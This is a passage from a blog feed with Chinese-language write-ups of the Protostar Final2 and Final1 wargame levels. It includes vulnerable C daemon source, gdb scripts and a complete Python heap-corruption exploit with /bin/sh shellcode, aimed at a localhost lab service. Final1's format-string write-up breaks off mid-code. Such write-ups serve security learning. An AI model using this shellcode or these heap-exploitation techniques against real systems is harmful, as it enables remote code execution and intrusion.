class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQSZ 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_path</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *start;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="keyword">int</span> l;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * Work out old software bug</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  p = rindex(buf, <span class="string">'/'</span>);</span><br><span class="line">  l = <span class="built_in">strlen</span>(p);</span><br><span class="line">  <span class="keyword">if</span>(p) &#123;</span><br><span class="line">      start = <span class="built_in">strstr</span>(buf, <span class="string">"ROOT"</span>);</span><br><span class="line">      <span class="keyword">if</span>(start) &#123;</span><br><span class="line">          <span class="keyword">while</span>(*start != <span class="string">'/'</span>) start--;</span><br><span class="line">          memmove(start, p, l);</span><br><span class="line">          <span class="comment">//printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start &lt; buf ? "yes" : "no", start - buf);</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_requests</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *buf;</span><br><span class="line">  <span class="keyword">char</span> *destroylist[<span class="number">256</span>];</span><br><span class="line">  <span class="keyword">int</span> dll;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  dll = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(dll &gt;= <span class="number">255</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      buf = <span class="built_in">calloc</span>(REQSZ, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">read</span>(fd, buf, REQSZ) != REQSZ) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(buf, <span class="string">"FSRD"</span>, <span class="number">4</span>) != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      check_path(buf + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">      destroylist[i] = buf;</span><br><span class="line"></span><br><span class="line">      dll++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; dll; i++) &#123;</span><br><span class="line">      <span class="built_in">write</span>(fd, <span class="string">"Process OK\n"</span>, <span class="built_in">strlen</span>(<span class="string">"Process OK\n"</span>));</span><br><span class="line">      <span class="built_in">free</span>(destroylist[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  get_requests(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>测试的脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><figcaption><span>Final2_1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">REQSZ = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2993</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(m)</span>:</span></span><br><span class="line">        padding = <span class="string">'\x00'</span>*(REQSZ-len(m))</span><br><span class="line">        _m = <span class="string">"FSRD"</span> + m + padding</span><br><span class="line">        <span class="keyword">return</span> _m[:REQSZ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = raw_input(<span class="string">"&gt; "</span>)</span><br><span class="line">        <span class="keyword">if</span> msg:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'msg: &#123;0&#125;'</span>.format(repr(pad(msg)))</span><br><span class="line">                s.send(pad(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p>gdb自动运行的命令</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>~/.gdbinit</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line"><span class="built_in">set</span> pagination off</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0804bd40</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"buf: %s\n"</span>, buf</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"dst: %s\n"</span>, start</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"src: %s\n"</span>, p</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"len"</span> %d\n<span class="string">", l</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">continue</span></span><br></pre></td></tr></table></figure></div><p>输入<code>AAAAA/ROOT/BBBB/CCCC</code><br><a href="https://dblu3.github.io/img/Protostar/final2_1.jpg" data-fancybox="group" data-caption="final2_1" class="fancybox"><img alt="final2_1" title="final2_1" data-src="https://dblu3.github.io/img/Protostar/final2_1.jpg" class="lazyload"></a></p><p>gdb查看内存<br><a href="https://dblu3.github.io/img/Protostar/final2_2.jpg" data-fancybox="group" data-caption="final2_2" class="fancybox"><img alt="final2_2" title="final2_2" data-src="https://dblu3.github.io/img/Protostar/final2_2.jpg" class="lazyload"></a></p><p>另一组输入<br><a href="https://dblu3.github.io/img/Protostar/final2_3.jpg" data-fancybox="group" data-caption="final2_3" class="fancybox"><img alt="final2_3" title="final2_3" data-src="https://dblu3.github.io/img/Protostar/final2_3.jpg" class="lazyload"></a></p><p>对应的内存<br><a href="https://dblu3.github.io/img/Protostar/final2_4.jpg" data-fancybox="group" data-caption="final2_4" class="fancybox"><img alt="final2_4" title="final2_4" data-src="https://dblu3.github.io/img/Protostar/final2_4.jpg" class="lazyload"></a></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>gdb查看ret和free的地址</p><p>address of ret:  0x0804be25<br>address of free: 0x0804be13</p><p>加入之前的命令中</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>~/.gdbinit</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line"><span class="built_in">set</span> pagination off</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0804bd40</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">x/<span class="number">64</span>wx <span class="number">0x804e000</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"buf: %s\n"</span>, buf</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"dst: %s\n"</span>, start</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"src: %s\n"</span>, p</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"len: %d\n"</span>, l</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0804be25</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">x/<span class="number">64</span>wx <span class="number">0x804e000</span></span><br><span class="line"><span class="built_in">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0804be13</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">x/<span class="number">64</span>wx <span class="number">0x804e000</span></span><br><span class="line"><span class="built_in">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div><p>发送数据</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><figcaption><span>Final2_2.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">REQSZ = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2993</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(m)</span>:</span></span><br><span class="line">        padding = <span class="string">'\x00'</span>*(REQSZ-len(m))</span><br><span class="line">        _m = <span class="string">"FSRD"</span> + m + padding</span><br><span class="line">        <span class="keyword">return</span> _m[:REQSZ]</span><br><span class="line"></span><br><span class="line">s.send(pad(<span class="string">'/ROOT/'</span> + <span class="string">'/'</span>*<span class="number">128</span>))</span><br><span class="line">s.send(pad(<span class="string">'ROOT/'</span> + <span class="string">'A'</span>*<span class="number">128</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = raw_input(<span class="string">"&gt; "</span>)</span><br><span class="line">        <span class="keyword">if</span> msg:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'msg: &#123;0&#125;'</span>.format(repr(pad(msg)))</span><br><span class="line">                s.send(pad(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final2_5.jpg" data-fancybox="group" data-caption="final2_5" class="fancybox"><img alt="final2_5" title="final2_5" data-src="https://dblu3.github.io/img/Protostar/final2_5.jpg" class="lazyload"></a></p><p><code>(gdb) disassemble get_requests</code></p><p><a href="https://dblu3.github.io/img/Protostar/final2_6.jpg" data-fancybox="group" data-caption="final2_6" class="fancybox"><img alt="final2_6" title="final2_6" data-src="https://dblu3.github.io/img/Protostar/final2_6.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">REQSZ = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2993</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(m)</span>:</span></span><br><span class="line">        padding = <span class="string">'\x00'</span>*(REQSZ-len(m))</span><br><span class="line">        _m = <span class="string">"FSRD"</span> + m + padding</span><br><span class="line">        <span class="keyword">return</span> _m[:REQSZ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line">exp += <span class="string">'\xeb\x0e'</span></span><br><span class="line">exp += <span class="string">'\x90'</span>*<span class="number">50</span> <span class="comment"># nop</span></span><br><span class="line">exp += shellcode</span><br><span class="line"></span><br><span class="line">addr_libc = <span class="number">0x804d41c</span><span class="number">-0xc</span></span><br><span class="line">addr_heap = <span class="number">0x804e020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a fake heap</span></span><br><span class="line">heap = struct.pack(<span class="string">"I"</span>, <span class="number">0xfffffffc</span>)</span><br><span class="line">heap += struct.pack(<span class="string">"I"</span>, <span class="number">0xfffffffc</span>)</span><br><span class="line">heap += struct.pack(<span class="string">"I"</span>, addr_libc)</span><br><span class="line">heap += struct.pack(<span class="string">"I"</span>, addr_heap)</span><br><span class="line"></span><br><span class="line">s.send(pad(<span class="string">'/ROOT/'</span> + exp + <span class="string">'/'</span>*<span class="number">128</span>))</span><br><span class="line">s.send(pad(<span class="string">'ROOT/'</span> + heap))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = raw_input(<span class="string">"&gt; "</span>)</span><br><span class="line">        <span class="keyword">if</span> msg:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'msg: &#123;0&#125;'</span>.format(repr(pad(msg)))</span><br><span class="line">                s.send(pad(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final2_7.jpg" data-fancybox="group" data-caption="final2_7" class="fancybox"><img alt="final2_7" title="final2_7" data-src="https://dblu3.github.io/img/Protostar/final2_7.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Final2&quot;&gt;&lt;a href=&quot;#Final2&quot; class=&quot;headerlink&quot; title=&quot;Final2&quot;&gt;&lt;/a&gt;Final2&lt;/h1&gt;&lt;p&gt;Final2: Protostar系列的最后一题了&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_final1</title>
    <link href="http://yoursite.com/2018/09/22/Protostar-final1/"/>
    <id>http://yoursite.com/2018/09/22/Protostar-final1/</id>
    <published>2018-09-22T13:18:00.000Z</published>
    <updated>2018-09-22T16:15:06.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Final1"><a href="#Final1" class="headerlink" title="Final1"></a>Final1</h1><p>Final1: remote blind format string</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Final1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syslog.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2994</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> username[<span class="number">128</span>];</span><br><span class="line"><span class="keyword">char</span> hostname[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">logit</span><span class="params">(<span class="keyword">char</span> *pw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"Login from %s as [%s] with password [%s]\n"</span>, hostname, username, pw);</span><br><span class="line"></span><br><span class="line">  syslog(LOG_USER|LOG_DEBUG, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trim</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line"></span><br><span class="line">  q = <span class="built_in">strchr</span>(str, <span class="string">'\r'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(str, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parser</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">line</span>[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[final1] $ "</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(fgets(<span class="built_in">line</span>, <span class="keyword">sizeof</span>(<span class="built_in">line</span>)<span class="number">-1</span>, <span class="built_in">stdin</span>)) &#123;</span><br><span class="line">      trim(<span class="built_in">line</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"username "</span>, <span class="number">9</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(username, <span class="built_in">line</span>+<span class="number">9</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"login "</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(username[<span class="number">0</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"invalid protocol\n"</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              logit(<span class="built_in">line</span> + <span class="number">6</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"login failed\n"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[final1] $ "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getipport</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> l;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">  l = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">  <span class="keyword">if</span>(getpeername(<span class="number">0</span>, &amp;<span class="built_in">sin</span>, &amp;l) == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(<span class="number">1</span>, <span class="string">"you don't exist"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(hostname, <span class="string">"%s:%d"</span>, inet_ntoa(<span class="built_in">sin</span>.sin_addr), ntohs(<span class="built_in">sin</span>.sin_port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  getipport();</span><br><span class="line">  parser();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>思路是用system的地址覆盖strncmp的地址</p><h2 id="strncmp"><a href="#strncmp" class="headerlink" title="strncmp"></a>strncmp</h2><p><a href="https://dblu3.github.io/img/Protostar/final1_1.jpg" data-fancybox="group" data-caption="final1_1" class="fancybox"><img alt="final1_1" title="final1_1" data-src="https://dblu3.github.io/img/Protostar/final1_1.jpg" class="lazyload"></a><br>连接后用root:godmode打开另一个终端</p><p>找到strncmp的地址<br><a href="https://dblu3.github.io/img/Protostar/final1_2.jpg" data-fancybox="group" data-caption="final1_2" class="fancybox"><img alt="final1_2" title="final1_2" data-src="https://dblu3.github.io/img/Protostar/final1_2.jpg" class="lazyload"></a></p><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p><a href="https://dblu3.github.io/img/Protostar/final1_3.jpg" data-fancybox="group" data-caption="final1_3" class="fancybox"><img alt="final1_3" title="final1_3" data-src="https://dblu3.github.io/img/Protostar/final1_3.jpg" class="lazyload"></a></p><h2 id="Offset"><a href="#Offset" class="headerlink" title="Offset"></a>Offset</h2><p><a href="https://dblu3.github.io/img/Protostar/final1_4.jpg" data-fancybox="group" data-caption="final1_4" class="fancybox"><img alt="final1_4" title="final1_4" data-src="https://dblu3.github.io/img/Protostar/final1_4.jpg" class="lazyload"></a></p><p><a href="https://dblu3.github.io/img/Protostar/final1_5.jpg" data-fancybox="group" data-caption="final1_5" class="fancybox"><img alt="final1_5" title="final1_5" data-src="https://dblu3.github.io/img/Protostar/final1_5.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 